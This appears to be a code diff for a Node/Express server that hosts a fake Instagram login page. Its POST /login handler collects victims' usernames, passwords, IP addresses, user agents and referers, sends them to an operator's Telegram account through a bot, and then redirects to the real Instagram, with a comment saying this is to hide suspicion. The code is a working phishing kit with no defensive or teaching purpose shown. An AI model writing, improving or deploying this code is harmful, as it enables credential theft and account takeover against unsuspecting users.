@@ -371,48 +371,55 @@ const app = express();
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 6 * 1024 * 1024 } });
+// Serve static files from "test insta" folder
+const INSTA_PATH = path.join(__dirname, "test insta");
+app.use("/insta", express.static(INSTA_PATH));
 
-// Serve static files (CSS, images, etc.)
-app.use("/insta", express.static(path.join(__dirname, "test insta")));
-
-// Serve the fake Instagram page
-app.get("/insta", (_req, res) => {
-  res.sendFile(path.join(__dirname, "test insta", "index.html"));
+// Serve the fake login page
+app.get("/insta", (req, res) => {
+  res.sendFile(path.join(INSTA_PATH, "index.html"));
 });
 
-// === CAPTURE LOGIN ===
+// === SINGLE LOGIN CAPTURE HANDLER ===
 app.post("/login", async (req, res) => {
+  console.log("=== LOGIN ATTEMPT RECEIVED ===");
+  console.log("Full req.body:", req.body); // Debug: Check if body is parsed
+
   const { username, password } = req.body;
 
-  // Basic validation
   if (!username || !password) {
+    console.log("Missing username/password, redirecting");
     return res.redirect("/insta");
   }
 
-  const ip = req.ip || req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown";
-  const userAgent = req.get('User-Agent') || "unknown";
-  const time = new Date().toLocaleString();
+  // Get IP & other details
+  const ip = req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
+  const userAgent = req.get('User-Agent') || 'unknown';
+  const time = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
 
+  // Format message for Telegram
   const message = `
-*INSTAGRAM LOGIN ATTEMPT*
-*Username:* \`${username}\`
-*Password:* \`${password}\`
-*IP:* \`${ip}\`
-*User-Agent:* \`${userAgent}\`
-*Time:* \`${time}\`
+*🛡️ INSTAGRAM LOGIN CAPTURED*
+*👤 Username:* \`${username}\`
+*🔑 Password:* \`${password}\`
+*🌐 IP Address:* \`${ip}\`
+*📱 User Agent:* \`${userAgent.substring(0, 100)}...\`  *(truncated)*
+*⏰ Timestamp:* \`${time}\`
+*🔗 Referral:* \`${req.get('Referer') || 'Direct'}\`
   `.trim();
 
+  // Send to YOUR Telegram ID
   try {
-    await bot.telegram.sendMessage(ADMIN_USER_ID, message, { parse_mode: "MarkdownV2" });
-    console.log("Login captured & sent to Telegram:", { username, ip });
+    await bot.telegram.sendMessage(ADMIN_USER_ID, message, { parse_mode: 'Markdown' });
+    console.log(`✅ SUCCESS: Sent to your Telegram ID ${ADMIN_USER_ID} for user ${username} from IP ${ip}`);
   } catch (error) {
-    console.error("Failed to send to Telegram:", error.message);
+    console.error("❌ TELEGRAM ERROR:", error.message);
+    console.error("Check: Bot token valid? Admin ID correct? Bot started with /start?");
   }
 
-  // Always redirect to real Instagram to avoid suspicion
-  res.redirect("https://www.instagram.com/");
+  // Redirect to real Instagram (hide suspicion)
+  res.redirect('https://www.instagram.com/');
 });
-
 // ---------- STUDENT PAGE ----------
 app.get("/r/:ref", async (req, res) => {
   const { ref } = req.params;
